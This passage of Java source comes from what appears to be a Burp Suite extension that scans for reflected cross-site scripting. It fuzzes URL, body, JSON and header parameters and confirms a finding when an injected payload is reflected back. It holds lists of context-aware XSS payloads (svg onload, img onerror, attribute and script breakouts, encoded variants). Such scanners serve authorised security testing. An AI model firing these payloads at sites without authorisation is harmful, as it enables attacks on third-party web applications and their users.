            this.target = target;
            this.severity = severity;
            this.confidence = confidence;
            this.http = http;
        }
    }

    private static final class FindingsTableModel extends AbstractTableModel {
        private final List<Finding> findings;

        private FindingsTableModel(List<Finding> findings) {
            this.findings = findings;
        }

        @Override
        public int getRowCount() {
            return findings.size();
        }

        @Override
        public int getColumnCount() {
            return 7;
        }

        @Override
        public String getColumnName(int column) {
            switch (column) {
                case 0:
                    return "Time";
                case 1:
                    return "Type";
                case 2:
                    return "Method";
                case 3:
                    return "URL";
                case 4:
                    return "Target";
                case 5:
                    return "Severity";
                case 6:
                    return "Confidence";
                default:
                    return "";
            }
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            Finding f = findings.get(rowIndex);
            switch (columnIndex) {
                case 0:
                    return f.timeIso;
                case 1:
                    return f.type;
                case 2:
                    return f.method;
                case 3:
                    return f.urlString;
                case 4:
                    return f.target;
                case 5:
                    return f.severity;
                case 6:
                    return f.confidence;
                default:
                    return "";
            }
        }
    }

    private static final class GenericIssue implements IScanIssue {
        private final URL url;
        private final String issueName;
        private final String issueDetail;
        private final String severity;
        private final String confidence;
        private final IHttpRequestResponse[] httpMessages;
        private final IHttpService httpService;

        private GenericIssue(URL url,
                             String issueName,
                             String issueDetail,
                             String severity,
                             String confidence,
                             IHttpRequestResponse[] httpMessages,
                             IHttpService httpService) {
            this.url = url;
            this.issueName = issueName;
            this.issueDetail = issueDetail;
            this.severity = severity;
            this.confidence = confidence;
            this.httpMessages = httpMessages;
            this.httpService = httpService;
        }

        @Override
        public URL getUrl() {
            return url;
        }

        @Override
        public String getIssueName() {
            return issueName;
        }

        @Override
        public int getIssueType() {
            return 0;
        }

        @Override
        public String getSeverity() {
            return severity;
        }

        @Override
        public String getConfidence() {
            return confidence;
        }

        @Override
        public String getIssueBackground() {
            return null;
        }

        @Override
        public String getRemediationBackground() {
            return null;
        }

        @Override
        public String getIssueDetail() {
            return issueDetail;
        }

        @Override
        public String getRemediationDetail() {
            return null;
        }

        @Override
        public IHttpRequestResponse[] getHttpMessages() {
            return httpMessages;
        }

        @Override
        public IHttpService getHttpService() {
            return httpService;
        }
    }

    private static final class ReflectionMatch {
        private final String value;
        private final int index;

        private ReflectionMatch(String value, int index) {
            this.value = value;
            this.index = index;
        }
    }

    private static List<String> buildBypassPayloads(String body, int reflectedIndex) {
        ReflectionContext ctx = detectReflectionContext(body, reflectedIndex);
        List<String> out = new ArrayList<>();

        if (ctx.inScript) {
            out.add("';alert(1);//");
            out.add("\";alert(1);//");
            out.add("</script><svg/onload=alert(1)>");
            out.add("\\u003csvg/onload=alert(1)\\u003e");
        } else if (ctx.inAttribute) {
            if (ctx.quote == '"') {
                out.add("\" autofocus onfocus=alert(1) x=\"");
                out.add("\"><svg/onload=alert(1)>");
            } else if (ctx.quote == '\'') {
                out.add("' autofocus onfocus=alert(1) x='");
                out.add("'><svg/onload=alert(1)>");
            } else {
                out.add(" onmouseover=alert(1) x=");
                out.add("><svg/onload=alert(1)>");
            }
            out.add("javascript:alert(1)");
        } else {
            out.add("<svg/onload=alert(1)>");
            out.add("<img src=x onerror=alert(1)>");
            out.add("<details open ontoggle=alert(1)>");
            out.add("<a href=javascript:alert(1)>x</a>");
        }

        out.add("%3Csvg%2Fonload%3Dalert(1)%3E");
        out.add("%253Csvg%252Fonload%253Dalert(1)%253E");
        out.add("&#x3c;svg&#x2f;onload=alert(1)&#x3e;");
        out.add("&lt;svg/onload=alert(1)&gt;");

        if (out.size() > 12) {
            return out.subList(0, 12);
        }
        return out;
    }

    private List<String> buildActiveCandidates() {
        List<String> merged = new ArrayList<>();
        merged.addAll(defaultGeneratedPayloads());
        merged.addAll(selectTopPayloads(getActivePayloads(), passiveFilePayloadLimit));

        List<String> out = new ArrayList<>();
        Set<String> localSeen = new HashSet<>();
        for (String p : merged) {
            if (p == null) {
                continue;
            }
            String v = p.trim();
            if (v.isEmpty()) {
                continue;
            }
            if (localSeen.add(v)) {
                out.add(v);
            }
        }
        return out;
    }

    private static List<String> defaultGeneratedPayloads() {
        List<String> out = new ArrayList<>();
        out.add("<svg/onload=alert(1)>");
        out.add("<img src=x onerror=alert(1)>");
        out.add("\"><svg/onload=alert(1)>");
        out.add("'><svg/onload=alert(1)>");
        out.add("</script><svg/onload=alert(1)>");
        out.add("\";alert(1);//");
        out.add("';alert(1);//");
        out.add("javascript:alert(1)");
        out.add("%3Csvg%2Fonload%3Dalert(1)%3E");
        out.add("%253Csvg%252Fonload%253Dalert(1)%253E");
        out.add("&#x3c;svg&#x2f;onload=alert(1)&#x3e;");
        out.add("&lt;svg/onload=alert(1)&gt;");
        return out;
    }

    private List<String> buildPassiveCandidates(String responseBody, int reflectedIndex) {
        List<String> merged = new ArrayList<>();

        merged.addAll(buildBypassPayloads(responseBody, reflectedIndex));
        merged.add("</ScRiPt><sVg/onload=alert(1)>");
        merged.add("<svg/onload=alert(1)>");
        merged.add("\"><svg/onload=alert(1)>");
        merged.add("<img src=x onerror=alert(1)>");

        List<String> fromFile = getActivePayloads();
        merged.addAll(selectTopPayloads(fromFile, passiveFilePayloadLimit));

        List<String> out = new ArrayList<>();
        Set<String> localSeen = new HashSet<>();
        for (String p : merged) {
            if (p == null) {
                continue;
            }
            String v = p.trim();
            if (v.isEmpty()) {
                continue;
            }
            if (localSeen.add(v)) {
                out.add(v);
            }
        }
        return out;
    }

    private List<String> selectTopPayloads(List<String> fromFile, int limit) {
        List<String> out = new ArrayList<>();
        if (fromFile == null || fromFile.isEmpty()) {
            return out;
        }
        Set<String> localSeen = new HashSet<>();
        for (String p : fromFile) {
            if (p == null) {
                continue;
            }
            String v = p.trim();
            if (v.isEmpty()) {
                continue;
            }
            if (localSeen.add(v)) {
                out.add(v);
                if (limit > 0 && out.size() >= limit) {
                    break;
                }
            }
        }
        return out;
    }

    private void confirmOneParamByPassiveSending(IHttpRequestResponse baseRequestResponse,
                                                IRequestInfo requestInfo,
                                                URL url,
                                                String responseBody,
                                                int reflectedIndex,
                                                IParameter parameter,
                                                String targetKey) {
        String stopKey = buildStopKey(baseRequestResponse.getHttpService(), requestInfo.getMethod(), url);
        if (triggeredKeys.contains(targetKey) || triggeredKeys.contains(stopKey)) {
            return;
        }
        List<String> candidates = buildPassiveCandidates(responseBody, reflectedIndex);
        int max = passiveMaxPayloadsPerParam <= 0 ? candidates.size() : Math.min(candidates.size(), passiveMaxPayloadsPerParam);
        Set<String> filePayloadSet = getActivePayloadSet();
        Set<String> nonTxtPayloads = new HashSet<>();
        nonTxtPayloads.addAll(buildBypassPayloads(responseBody, reflectedIndex));
        nonTxtPayloads.add("</ScRiPt><sVg/onload=alert(1)>");
        nonTxtPayloads.add("<svg/onload=alert(1)>");
        nonTxtPayloads.add("\"><svg/onload=alert(1)>");
        nonTxtPayloads.add("<img src=x onerror=alert(1)>");
        for (int i = 0; i < max; i++) {
            if (triggeredKeys.contains(targetKey) || triggeredKeys.contains(stopKey)) {
                return;
            }
            String payload = candidates.get(i);
            if (payload == null) {
                continue;
            }
            payload = payload.trim();
            if (payload.isEmpty()) {
                continue;
            }

            String valueForRequest = payload;
            byte type = parameter.getType();
            if (type == IParameter.PARAM_URL || type == IParameter.PARAM_BODY || type == IParameter.PARAM_JSON) {
                try {
                    valueForRequest = helpers.urlEncode(payload);
                } catch (Exception ignored) {
                    valueForRequest = payload;
                }
            }

            byte[] attackRequest = null;
            if (parameter.getType() == IParameter.PARAM_JSON) {
                // 优先尝试Raw替换，如果失败再回退到Burp的updateParameter
                attackRequest = replaceJsonParam(baseRequestResponse.getRequest(), requestInfo.getBodyOffset(), parameter.getName(), valueForRequest);
            } else if (parameter.getType() == IParameter.PARAM_BODY) {
                attackRequest = replaceBodyParam(baseRequestResponse.getRequest(), requestInfo.getBodyOffset(), parameter.getName(), valueForRequest);
            }
            if (attackRequest == null) {
                IParameter newParam = helpers.buildParameter(parameter.getName(), valueForRequest, parameter.getType());
                attackRequest = helpers.updateParameter(baseRequestResponse.getRequest(), newParam);
            }
            attackRequest = addMarkerHeader(attackRequest);
            IHttpRequestResponse attack = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), attackRequest);
            byte[] attackResponse = attack.getResponse();
            if (attackResponse == null || attackResponse.length == 0) {
                continue;
            }

            IResponseInfo attackResponseInfo = helpers.analyzeResponse(attackResponse);
            if (!isCandidateResponse(attackResponseInfo.getHeaders())) {
                continue;
            }

            if (!responseReflectsPayload(attackResponse, attackResponseInfo.getBodyOffset(), valueForRequest)) {
                continue;
            }

            IHttpRequestResponsePersisted persisted = callbacks.saveBuffersToTempFiles(attack);
            String issueName = "XSS成功 (参数: " + parameter.getName() + ")";
            String severity = "High";
            String confidence = "Certain";

            IScanIssue issue = new GenericIssue(
                    url,
                    issueName,
                    buildTriggeredXssIssueDetail("参数", parameter.getName(), payload),
                    severity,
                    confidence,
                    new IHttpRequestResponse[]{persisted},
                    persisted.getHttpService()
            );

            triggeredKeys.add(targetKey);
            triggeredKeys.add(stopKey);
            callbacks.addScanIssue(issue);

            String uiKey = url.toString() + "|XSS成功|PASSIVE|" + parameter.getName();
            if (seen.add(uiKey)) {
                addFinding(new Finding(
                        Instant.now().toEpochMilli(),
                        "XSS成功",
                        url,
                        requestInfo.getMethod(),
                        parameter.getName(),
                        severity,
                        confidence,
                        persisted
                ));
            }

            return;
        }
    }

    private boolean allowAndRecordByPathRule(IHttpService service, String method, URL url, IRequestInfo requestInfo, byte[] requestBytes) {
        if (url == null) {
            return true;
        }
        String serviceKey = service == null ? "" : (service.getProtocol() + "://" + service.getHost() + ":" + service.getPort());
        String path = url.getPath() == null ? "" : url.getPath();

        Set<String> uniq = new HashSet<>();

        String query = url.getQuery();
        if (query != null && !query.trim().isEmpty()) {
            for (String n : extractQueryParamNames(query)) {
                if (n == null) {
                    continue;
                }
                String nn = n.trim();
                if (!nn.isEmpty()) {
                    uniq.add("U:" + nn);
                }
            }
        }

        if (requestInfo != null) {
            for (IParameter p : requestInfo.getParameters()) {
                if (p == null) {
                    continue;
                }
                int t = p.getType();
                if (t != IParameter.PARAM_URL && t != IParameter.PARAM_BODY && t != IParameter.PARAM_JSON) {
                    continue;
                }
                String name = p.getName();
                if (name == null) {
                    continue;
                }
                String nn = name.trim();
                if (nn.isEmpty()) {
                    continue;
                }
                uniq.add(t + ":" + nn);
            }
        }

        if (requestInfo != null && requestBytes != null && "POST".equalsIgnoreCase(method)) {
            String body = extractRequestBodyAsString(requestBytes, requestInfo.getBodyOffset());
            if (isFormUrlEncoded(requestInfo.getHeaders()) || (body.contains("=") && !body.trim().startsWith("{"))) {
                for (String n : extractQueryParamNames(body)) {
                    if (n == null) {
                        continue;
                    }
                    String nn = n.trim();
                    if (!nn.isEmpty()) {
                        uniq.add("B:" + nn);
                    }
                }
            } else if (body.trim().startsWith("{")) {
                for (String n : extractJsonParamNames(body)) {
                    if (n == null) {
                        continue;
                    }
                    String nn = n.trim();
                    if (!nn.isEmpty()) {
                        uniq.add(IParameter.PARAM_JSON + ":" + nn);
                    }
                }
            }
        }

        if (uniq.isEmpty()) {
            String key = serviceKey + "|" + method + "|" + path;
            return seenPathOnlyKeys.add(key);
        }

        List<String> parts = new ArrayList<>(uniq);
        Collections.sort(parts);
        String key = serviceKey + "|" + method + "|" + path + "|SIG|" + Integer.toHexString(parts.toString().hashCode());
        return seenPathParamSigKeys.add(key);
    }

    private void clearHistory() {
        clearHistoryData();
        clearHistoryUi();
    }

    private void clearHistoryAsync(JButton button) {
        if (button != null) {
            button.setEnabled(false);
        }
        Thread t = new Thread(() -> {
            try {
                clearHistoryData();
            } finally {
                SwingUtilities.invokeLater(() -> {
                    try {
                        clearHistoryUi();
                    } finally {
                        if (button != null) {
                            button.setEnabled(true);
                        }
                    }
                });
            }
        }, "PassiveXSS-ClearHistory");
        t.setDaemon(true);
        try {
            t.setPriority(Math.max(Thread.MIN_PRIORITY, Thread.NORM_PRIORITY - 1));
        } catch (Exception ignored) {
        }
        t.start();
    }

    private void clearHistoryData() {
        seen.clear();
        queuedKeys.clear();
        attemptedPacketKeys = new LruSet(6000);
        seenPathOnlyKeys = new LruSet(6000);
        seenPathQueryKeys = new LruSet(12000);
        seenPathParamSigKeys = new LruSet(12000);
        synchronized (findingsLock) {
            findings.clear();
        }
    }

    private void clearHistoryUi() {
        if (tableModel != null) {
            tableModel.fireTableDataChanged();
        }
        selectedFinding = null;
        if (findingsTable != null) {
            findingsTable.clearSelection();
        }
        if (requestViewer != null) {
            requestViewer.setMessage(null, true);
        }
        if (responseViewer != null) {
            responseViewer.setMessage(null, false);
        }
        if (detailsCardLayout != null && detailsCardPanel != null) {
            detailsCardLayout.show(detailsCardPanel, DETAILS_CARD_PLACEHOLDER);
        }
    }

    private void clearSelectedAsync(JButton button) {
        if (findingsTable == null) {
            return;
        }
        int[] selected = findingsTable.getSelectedRows();
        if (selected == null || selected.length == 0) {
            return;
        }
        final int[] rows = Arrays.copyOf(selected, selected.length);
        if (button != null) {
            button.setEnabled(false);
        }
        Thread t = new Thread(() -> {
            Arrays.sort(rows);
            SwingUtilities.invokeLater(() -> {
                try {
                    List<int[]> ranges = new ArrayList<>();
                    int start = -1;
                    int prev = -1;
                    for (int i = 0; i < rows.length; i++) {
                        int v = rows[i];
                        if (start < 0) {
                            start = v;
                            prev = v;
                            continue;
                        }
                        if (v == prev + 1) {
                            prev = v;
                            continue;
                        }
                        ranges.add(new int[]{start, prev});
                        start = v;
                        prev = v;
                    }
                    if (start >= 0) {
                        ranges.add(new int[]{start, prev});
                    }

                    for (int i = ranges.size() - 1; i >= 0; i--) {
                        int[] r = ranges.get(i);
                        int s = r[0];
                        int e = r[1];
                        synchronized (findingsLock) {
                            for (int idx = e; idx >= s; idx--) {
                                if (idx >= 0 && idx < findings.size()) {
                                    findings.remove(idx);
                                }
                            }
                        }
                        if (tableModel != null) {
                            tableModel.fireTableRowsDeleted(s, e);
                        }
                    }
                    selectedFinding = null;
                    findingsTable.clearSelection();
                    if (requestViewer != null) {
                        requestViewer.setMessage(null, true);
                    }
                    if (responseViewer != null) {
                        responseViewer.setMessage(null, false);
                    }
                    if (detailsCardLayout != null && detailsCardPanel != null) {
                        detailsCardLayout.show(detailsCardPanel, DETAILS_CARD_PLACEHOLDER);
                    }
                } finally {
                    if (button != null) {
                        button.setEnabled(true);
                    }
                }
            });
        }, "PassiveXSS-ClearSelected");
        t.setDaemon(true);
        try {
            t.setPriority(Math.max(Thread.MIN_PRIORITY, Thread.NORM_PRIORITY - 1));
        } catch (Exception ignored) {
        }
        t.start();
    }

    private void queueAutoFuzzJobs(IHttpRequestResponse baseRequestResponse,
                                   IRequestInfo requestInfo,
                                   URL url,
                                   String responseBody) {
        if (baseRequestResponse == null || requestInfo == null || url == null) {
            return;
        }
        byte[] baseRequest = baseRequestResponse.getRequest();
        if (baseRequest == null || baseRequest.length == 0) {
            return;
        }
        ExecutorService exec = passiveFuzzExecutor;
        if (exec == null) {
            return;
        }

        String method = requestInfo.getMethod();
        if (method == null) {
            return;
        }
        String upper = method.trim().toUpperCase(Locale.ROOT);
        boolean brute = bruteFuzzEnabled;
        boolean headerFuzz = headerFuzzEnabled;

        if ("GET".equals(upper)) {
            if (!allowAndRecordByPathRule(baseRequestResponse.getHttpService(), method, url, requestInfo, baseRequest)) {
                return;
            }

            String packetKeyPrefix = buildPacketKeyPrefix(baseRequestResponse.getHttpService(), method, url, requestInfo, baseRequest);
            if (headerFuzz) {
                queueHeaderFuzz(exec, baseRequestResponse, requestInfo, url, responseBody, packetKeyPrefix, "User-Agent");
                queueHeaderFuzz(exec, baseRequestResponse, requestInfo, url, responseBody, packetKeyPrefix, "Referer");
                queueHeaderFuzz(exec, baseRequestResponse, requestInfo, url, responseBody, packetKeyPrefix, "Cookie");
            }
            List<IParameter> urlParams = new ArrayList<>();
            for (IParameter p : requestInfo.getParameters()) {
                if (p == null) {
                    continue;
                }
                if (p.getType() == IParameter.PARAM_URL) {
                    urlParams.add(p);
                }
            }

            LinkedHashMap<String, String> orderedQueryPairs = extractUrlEncodedParamsOrdered(url.getQuery());
            LinkedHashMap<String, IParameter> byName = new LinkedHashMap<>();
            for (String n : orderedQueryPairs.keySet()) {
                if (n == null) {
                    continue;
                }
                String nn = n.trim();
                if (!nn.isEmpty()) {
                    byName.put(nn, null);
                }
            }
            for (IParameter p : urlParams) {
                if (p == null) {
                    continue;
                }
                String name = p.getName();
                if (name == null) {
                    continue;
                }
                String nn = name.trim();
                if (nn.isEmpty()) {
                    continue;
                }
                if (byName.containsKey(nn)) {
                    byName.put(nn, p);
                } else if (brute || byName.isEmpty()) {
                    byName.put(nn, p);
                }
            }

            List<IParameter> targets = new ArrayList<>();
            if (!byName.isEmpty()) {
                for (Map.Entry<String, IParameter> e : byName.entrySet()) {
                    IParameter p = e.getValue();
                    if (p != null) {
                        targets.add(p);
                        continue;
                    }
                    String v = orderedQueryPairs.get(e.getKey());
                    targets.add(helpers.buildParameter(e.getKey(), v == null ? "" : v, IParameter.PARAM_URL));
                }
            } else {
                targets.addAll(urlParams);
            }

            int picked = 0;
            for (IParameter p : targets) {
                if (p == null) {
                    continue;
                }
                String pName = p.getName();
                if (pName == null || pName.trim().isEmpty()) {
                    continue;
                }
                if (!brute && picked >= AUTO_MAX_GET_PARAMS) {
                    break;
                }

                String targetName = pName;
                String targetKey = buildTargetKey(baseRequestResponse.getHttpService(), method, url, "PASSIVE", targetName);
                if (triggeredKeys.contains(targetKey)) {
                    continue;
                }

                String packetKey = packetKeyPrefix + "|AUTO|" + p.getType() + "|" + targetName;
                if (!attemptedPacketKeys.add(packetKey)) {
                    continue;
                }

                String rawValue = p.getValue();
                String decodedValue;
                try {
                    decodedValue = helpers.urlDecode(rawValue);
                } catch (Exception ignored) {
                    decodedValue = rawValue;
                }
                ReflectionMatch match = firstReflectionMatch(responseBody, rawValue, decodedValue);
                int reflectedIndex = match == null ? 0 : match.index;

                picked++;
                final int reflectedIndexFinal = reflectedIndex;
                final IParameter pFinal = p;
                final String targetKeyFinal = targetKey;
                exec.execute(() -> {
                    try {
                        confirmOneParamByPassiveSending(baseRequestResponse, requestInfo, url, responseBody, reflectedIndexFinal, pFinal, targetKeyFinal);
                    } catch (Exception ignored) {
                    }
                });
            }
            return;
        }

        if ("POST".equals(upper)) {
            if (!allowAndRecordByPathRule(baseRequestResponse.getHttpService(), method, url, requestInfo, baseRequest)) {
                return;
            }

            String packetKeyPrefix = buildPacketKeyPrefix(baseRequestResponse.getHttpService(), method, url, requestInfo, baseRequest);
            if (headerFuzz) {
                queueHeaderFuzz(exec, baseRequestResponse, requestInfo, url, responseBody, packetKeyPrefix, "User-Agent");
                queueHeaderFuzz(exec, baseRequestResponse, requestInfo, url, responseBody, packetKeyPrefix, "Referer");
                queueHeaderFuzz(exec, baseRequestResponse, requestInfo, url, responseBody, packetKeyPrefix, "Cookie");
            }
            int picked = 0;
            LinkedHashMap<String, String> orderedBodyPairs = new LinkedHashMap<>();
            String bodyStr = extractRequestBodyAsString(baseRequest, requestInfo.getBodyOffset());
            if (isFormUrlEncoded(requestInfo.getHeaders()) || (bodyStr.contains("=") && !bodyStr.trim().startsWith("{"))) {
                orderedBodyPairs = extractUrlEncodedParamsOrdered(bodyStr);
            }
            LinkedHashMap<String, String> orderedUrlPairs = extractUrlEncodedParamsOrdered(url.getQuery());

            LinkedHashMap<String, IParameter> orderedBodyParams = new LinkedHashMap<>();
            for (String n : orderedBodyPairs.keySet()) {
                if (n == null) {
                    continue;
                }
                String nn = n.trim();
                if (!nn.isEmpty()) {
                    String value = orderedBodyPairs.get(n);
                    orderedBodyParams.put(nn, helpers.buildParameter(nn, value != null ? value : "", IParameter.PARAM_BODY));
                }
            }
            LinkedHashMap<String, IParameter> orderedUrlParams = new LinkedHashMap<>();
            for (String n : orderedUrlPairs.keySet()) {
                if (n == null) {
                    continue;
                }
                String nn = n.trim();
                if (!nn.isEmpty()) {
                    orderedUrlParams.put(nn, null);
                }
            }

            List<IParameter> jsonParams = new ArrayList<>();
            for (IParameter p : requestInfo.getParameters()) {
                if (p != null && p.getType() == IParameter.PARAM_JSON) {
                    jsonParams.add(p);
                }
            }

            // 如果requestInfo没解析出JSON参数，尝试手动解析
            if (jsonParams.isEmpty() && bodyStr.trim().startsWith("{")) {
                List<String> manualJsonNames = extractJsonParamNames(bodyStr);
                for (String name : manualJsonNames) {
                    // 使用PARAM_JSON类型，让Burp的updateParameter去尝试更新
                    // 注意：这里的value为空，因为我们不知道原始value，但fuzz时会替换value
                    jsonParams.add(helpers.buildParameter(name, "", IParameter.PARAM_JSON));
                }
            }

            // 优先使用从原始body解析的参数，确保所有参数都被处理
            // 只在brute模式下才添加Burp解析的额外参数
            if (brute) {
                for (IParameter p : requestInfo.getParameters()) {
                    if (p == null) {
                        continue;
                    }
                    if (p.getType() == IParameter.PARAM_COOKIE) {
                        continue;
                    }
                    String name = p.getName();
                    if (name == null) {
                        continue;
                    }
                    String nn = name.trim();
                    if (nn.isEmpty()) {
                        continue;
                    }
                    if (p.getType() == IParameter.PARAM_BODY) {
                        if (!orderedBodyParams.containsKey(nn)) {
                            orderedBodyParams.put(nn, p);
                        }
                        continue;
                    }
                    if (p.getType() == IParameter.PARAM_URL) {
                        if (!orderedUrlParams.containsKey(nn)) {
                            orderedUrlParams.put(nn, p);
                        }
                    }
                }
            }

            List<IParameter> merged = new ArrayList<>();
            for (Map.Entry<String, IParameter> e : orderedBodyParams.entrySet()) {
                IParameter p = e.getValue();
                if (p != null) {
                    merged.add(p);
                    continue;
                }
                String v = orderedBodyPairs.get(e.getKey());
                merged.add(helpers.buildParameter(e.getKey(), v == null ? "" : v, IParameter.PARAM_BODY));
            }
            for (Map.Entry<String, IParameter> e : orderedUrlParams.entrySet()) {
                IParameter p = e.getValue();
                if (p != null) {
                    merged.add(p);
                    continue;
                }
                String v = orderedUrlPairs.get(e.getKey());
                merged.add(helpers.buildParameter(e.getKey(), v == null ? "" : v, IParameter.PARAM_URL));
            }
            merged.addAll(jsonParams);

            if (merged.isEmpty()) {
                for (IParameter p : requestInfo.getParameters()) {
                    if (p == null) {
                        continue;
                    }
                    if (p.getType() == IParameter.PARAM_COOKIE) {
                        continue;
                    }
                    merged.add(p);
                }
            }

            for (IParameter p : merged) {
                if (!brute && picked >= AUTO_MAX_POST_PARAMS) {
                    break;
                }
                if (p == null) {
                    continue;
                }
                String targetName = p.getName();
                if (targetName == null || targetName.trim().isEmpty()) {
                    continue;
                }
                String targetKey = buildTargetKey(baseRequestResponse.getHttpService(), method, url, "PASSIVE", targetName);
                if (triggeredKeys.contains(targetKey)) {
                    continue;
                }
                String packetKey = packetKeyPrefix + "|AUTO|" + p.getType() + "|" + targetName;
                if (!attemptedPacketKeys.add(packetKey)) {
                    continue;
                }

                String rawValue = p.getValue();
                String decodedValue;
                try {
                    decodedValue = helpers.urlDecode(rawValue);
                } catch (Exception ignored) {
                    decodedValue = rawValue;
                }
                ReflectionMatch match = firstReflectionMatch(responseBody, rawValue, decodedValue);
                int reflectedIndex = match == null ? 0 : match.index;

                picked++;
                final int reflectedIndexFinal = reflectedIndex;
                final IParameter pFinal = p;
                final String targetKeyFinal = targetKey;
                exec.execute(() -> {
                    try {
                        confirmOneParamByPassiveSending(baseRequestResponse, requestInfo, url, responseBody, reflectedIndexFinal, pFinal, targetKeyFinal);
                    } catch (Exception ignored) {
                    }
                });
            }
        }
    }

    private byte[] replaceBodyParam(byte[] request, int bodyOffset, String paramName, String newValue) {
        if (request == null || paramName == null) {
            return null;
        }
        try {
            String body = extractRequestBodyAsString(request, bodyOffset);
            if (body.isEmpty()) {
                return null;
            }

            String escapedName = java.util.regex.Pattern.quote(paramName);
            String regex = "(^|[&;])(" + escapedName + ")=([^&;]*)";
            java.util.regex.Pattern pattern = java.util.regex.Pattern.compile(regex);
            java.util.regex.Matcher matcher = pattern.matcher(body);

            if (matcher.find()) {
                StringBuffer sb = new StringBuffer();
                String replacement = "$1$2=" + java.util.regex.Matcher.quoteReplacement(newValue);
                matcher.appendReplacement(sb, replacement);
                matcher.appendTail(sb);

                String newBodyStr = sb.toString();
                byte[] newBody = newBodyStr.getBytes(StandardCharsets.ISO_8859_1);

                List<String> headers = helpers.analyzeRequest(request).getHeaders();
                return helpers.buildHttpMessage(headers, newBody);
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private byte[] replaceJsonParam(byte[] request, int bodyOffset, String paramName, String newValue) {
        if (request == null || paramName == null) {
            return null;
        }
        try {
            String body = extractRequestBodyAsString(request, bodyOffset);
            if (body.isEmpty()) {
                return null;
            }

            // 简单匹配 "key": "val" 或 "key": 123
            // 考虑 key 前后的空白，以及冒号后的值
            // 值可能是字符串（双引号包围）或数字/布尔/null（无引号）
            String escapedName = java.util.regex.Pattern.quote(paramName);
            
            // 1. 匹配字符串值: "key"\s*:\s*"([^"]*)"
            String regexStr = "(\"" + escapedName + "\"\\s*:\\s*\")((?:\\\\.|[^\"\\\\])*)(\")";
            java.util.regex.Pattern pStr = java.util.regex.Pattern.compile(regexStr);
            java.util.regex.Matcher mStr = pStr.matcher(body);
            if (mStr.find()) {
                StringBuffer sb = new StringBuffer();
                // $1 是 "key": "
                // $3 是 "
                String replacement = "$1" + java.util.regex.Matcher.quoteReplacement(newValue) + "$3";
                mStr.appendReplacement(sb, replacement);
                mStr.appendTail(sb);
                
                String newBodyStr = sb.toString();
                byte[] newBody = newBodyStr.getBytes(StandardCharsets.ISO_8859_1);
                List<String> headers = helpers.analyzeRequest(request).getHeaders();
                return helpers.buildHttpMessage(headers, newBody);
            }

            // 2. 匹配非字符串值 (数字, true, false, null): "key"\s*:\s*([^,}\]\s]+)
            // 注意：这种情况下，如果我们要替换为payload（通常是字符串），可能需要加上引号？
            // 或者是攻击者希望注入到数字位置，那直接替换即可。
            // 但XSS payload通常包含字符，JSON要求字符串必须有引号。
            // 如果原值是数字 123，我们想注入 <script>，必须变成 "key": "<script>" 否则JSON格式错误
            // 这里为了简单，如果原值是数字，我们强制加上引号变成字符串注入
            
            String regexNum = "(\"" + escapedName + "\"\\s*:\\s*)([^,}\\]\\s]+)";
            java.util.regex.Pattern pNum = java.util.regex.Pattern.compile(regexNum);
            java.util.regex.Matcher mNum = pNum.matcher(body);
            if (mNum.find()) {
                StringBuffer sb = new StringBuffer();
                // $1 是 "key": 
                // 我们把新值用引号包起来，确保是合法的JSON字符串
                String replacement = "$1\"" + java.util.regex.Matcher.quoteReplacement(newValue) + "\"";
                mNum.appendReplacement(sb, replacement);
                mNum.appendTail(sb);
                
                String newBodyStr = sb.toString();
                byte[] newBody = newBodyStr.getBytes(StandardCharsets.ISO_8859_1);
                List<String> headers = helpers.analyzeRequest(request).getHeaders();
                return helpers.buildHttpMessage(headers, newBody);
            }

        } catch (Exception ignored) {
        }
        return null;
    }

    private static LinkedHashMap<String, String> extractUrlEncodedParamsOrdered(String query) {
        LinkedHashMap<String, String> out = new LinkedHashMap<>();
        if (query == null) {
            return out;
        }
        String q = query.trim();
        if (q.isEmpty()) {
            return out;
        }
        String[] parts = q.split("[&;]");
        for (String part : parts) {
            if (part == null) {
                continue;
            }
            String p = part.trim();
            if (p.isEmpty()) {
                continue;
            }
            int eq = p.indexOf('=');
            String name = eq >= 0 ? p.substring(0, eq) : p;
            String value = eq >= 0 ? p.substring(eq + 1) : "";
            if (name == null) {
                continue;
            }
            String n = name.trim();
            if (n.isEmpty()) {
                continue;
            }
            if (!out.containsKey(n)) {
                out.put(n, value);
            }
        }
        return out;
    }

    private static List<String> extractQueryParamNames(String query) {
        List<String> out = new ArrayList<>();
        if (query == null) {
            return out;
        }
        String q = query.trim();
        if (q.isEmpty()) {
            return out;
        }
        String[] parts = q.split("[&;]");
        for (String part : parts) {
            if (part == null) {
                continue;
            }
            String p = part.trim();
            if (p.isEmpty()) {
                continue;
            }
            int eq = p.indexOf('=');
            String name = eq >= 0 ? p.substring(0, eq) : p;
            if (name == null) {
                continue;
            }
            String n = name.trim();
            if (!n.isEmpty()) {
                out.add(n);
            }
        }
        return out;
    }

    private static List<String> extractJsonParamNames(String json) {
        List<String> out = new ArrayList<>();
        if (json == null) {
            return out;
        }
        String j = json.trim();
        if (!j.startsWith("{")) {
            return out;
        }
        try {
            java.util.regex.Pattern p = java.util.regex.Pattern.compile("\"((?:\\\\.|[^\"\\\\])*)\"\\s*:");
            java.util.regex.Matcher m = p.matcher(j);
            while (m.find()) {
                String name = m.group(1);
                if (name != null && !name.trim().isEmpty()) {
                    out.add(name.trim());
                }
            }
        } catch (Exception ignored) {
        }
        return out;
    }

    private static String extractRequestBodyAsString(byte[] requestBytes, int bodyOffset) {
        if (requestBytes == null || requestBytes.length == 0) {
            return "";
        }
        int off = Math.max(0, Math.min(bodyOffset, requestBytes.length));
        if (off >= requestBytes.length) {
            return "";
        }
        try {
            return new String(requestBytes, off, requestBytes.length - off, StandardCharsets.ISO_8859_1);
        } catch (Exception ignored) {
            return "";
        }
    }

    private static boolean isFormUrlEncoded(List<String> headers) {
        if (headers == null || headers.isEmpty()) {
            return false;
        }
        for (String h : headers) {
            if (h == null) {
                continue;
            }
            int idx = h.indexOf(':');
            if (idx <= 0) {
                continue;
            }
            String name = h.substring(0, idx).trim().toLowerCase(Locale.ROOT);
            if (!"content-type".equals(name)) {
                continue;
            }
            String v = h.substring(idx + 1).trim().toLowerCase(Locale.ROOT);
            return v.contains("application/x-www-form-urlencoded");
        }
        return false;
    }

    private static String buildPacketKeyPrefix(IHttpService service, String method, URL url, IRequestInfo requestInfo, byte[] requestBytes) {
        String serviceKey = service == null ? "" : (service.getProtocol() + "://" + service.getHost() + ":" + service.getPort());
        String path = url == null ? "" : url.getPath();
